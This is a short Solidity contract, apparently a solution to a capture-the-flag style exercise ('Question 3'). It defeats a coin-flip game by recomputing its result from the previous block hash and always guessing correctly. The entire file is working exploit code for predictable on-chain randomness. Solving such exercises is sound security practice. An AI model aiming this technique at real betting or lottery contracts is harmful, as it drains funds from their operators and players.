/**
 *Submitted for verification at Etherscan.io on 2022-06-25
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Question 3
interface ICoinFlip {
    function consecutiveWins() external view returns(uint256);
    function flip(bool _guess) external returns (bool);
}

contract Solution3 {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hack(address _flip) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        require(ICoinFlip(_flip).flip(guess), "hack fails");
    }

    function consecutiveWins(address _flip) public view returns(uint256) {
        return ICoinFlip(_flip).consecutiveWins();
    }
}